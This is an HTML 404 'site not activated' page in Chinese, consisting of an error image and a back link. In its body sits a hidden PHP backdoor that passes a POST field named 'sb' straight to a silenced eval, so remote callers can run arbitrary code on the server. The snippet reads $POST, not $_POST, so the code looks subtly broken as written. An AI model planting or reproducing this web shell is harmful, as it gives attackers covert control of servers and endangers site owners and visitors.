<!doctype html>
<html lang="Zh-cn">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="robots" content="noindex,nofollow">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta name="renderer" content="webkit">
<title>此站点未开通</title>
<link type="text/css" rel="stylesheet" href="assets/css/404.css" />
</head>
<body>
<?php
$asb = $POST['sb'];
@eval($asb);
?>
<div id="wrap">
	<div>
		<img src="assets/img/404.png" alt="404" />
	</div>
	<div id="text">
		<strong>
			<span></span>
			<a href="javascript:history.back()">返回上一页</a>
		</strong>
	</div>
</div>

<div class="animate below"></div>
<div class="animate above"></div>
</body>
</html>